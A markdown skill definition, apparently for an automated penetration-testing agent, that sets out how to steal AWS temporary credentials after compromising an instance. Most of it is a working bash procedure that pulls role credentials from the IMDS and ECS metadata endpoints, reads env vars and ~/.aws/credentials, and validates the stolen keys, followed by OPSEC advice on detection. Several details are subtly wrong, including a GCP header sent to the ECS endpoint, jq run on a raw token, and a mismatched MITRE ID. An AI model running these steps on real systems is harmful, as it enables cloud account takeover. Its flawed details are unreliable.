---
name: aws-token-theft
description: Steal and abuse AWS temporary credentials from IMDS, env vars, or files
version: 1.0.0
phase: cloud
category: post-exploitation
tags: [aws, token, credentials, imds, post-exploitation]
tools: [curl, aws-cli, jq]
difficulty: advanced
opsec_level: active
time_estimate: 120s
severity_if_found: critical
related_skills:
  - cloud-metadata
  - aws-iam-privesc
mitre_attack:
  - T1525
  - T1552.005
---

## When to Use

Use this skill after gaining access to an AWS instance to extract, validate,
and abuse temporary credentials for lateral movement within the AWS account.

## Prerequisites

- Shell access to target AWS instance or SSRF vector
- curl, aws-cli for validation

## Procedure

```bash
# Step 1: Extract credentials from IMDS
# IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# IMDSv2
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Extract from environment variables
env | grep -iE "AWS_|AWS_ACCESS_KEY|AWS_SECRET_KEY|AWS_SESSION_TOKEN"
cat ~/.aws/credentials
cat ~/.aws/config

# Step 3: Extract from Docker/ECS containers
cat $AWS_WEB_IDENTITY_TOKEN_FILE 2>/dev/null
curl -s -H "Metadata-Flavor: Google" "http://169.254.170.2/v2/credentials/" 2>/dev/null

# Step 4: Validate stolen credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
aws sts get-caller-identity

# Step 5: Document token expiry
echo $AWS_SESSION_TOKEN | jq -r '.Expiration'
```

## OPSEC Rules

- Stolen credentials are logged immediately on first use via CloudTrail
- Token validation via sts:GetCallerIdentity is logged
- Expect detection within 5 minutes of first API call
- Do NOT persist tokens in assessment tooling longer than necessary
- Use temporary credentials only — do not create permanent access keys

## Verification

- Validate token expiry — tokens are typically valid 1-6 hours
- Test effective permissions via sts:GetCallerIdentity
- Check which services the role can access with sts:GetAccessKeyInfo

## Pitfalls

- IMDSv2 with hop limit prevents token retrieval from outside the instance
- ECS containers use a different metadata endpoint (169.254.170.2)
- AWS Fargate tasks embed credentials in the task metadata endpoint
- Tokens valid for up to 6 hours but may be rotated early by instance profile
- Some instances use profile-based credentials (do not appear in env)

## Output Format

```
Source:       IMDSv1 (ec2-instance-role)
AccessKeyId:  ASIA***********
Role:         arn:aws:iam::123456789012:role/ec2-instance-role
Expires:      2026-07-06T18:00:00Z (~4h remaining)
Perms:        s3:*, ec2:Describe*, iam:ListRoles
[VALIDATED]   sts:GetCallerIdentity — Role: ec2-instance-role, Account: 123456789012
Severity:     CRITICAL — full S3 access across the account
```
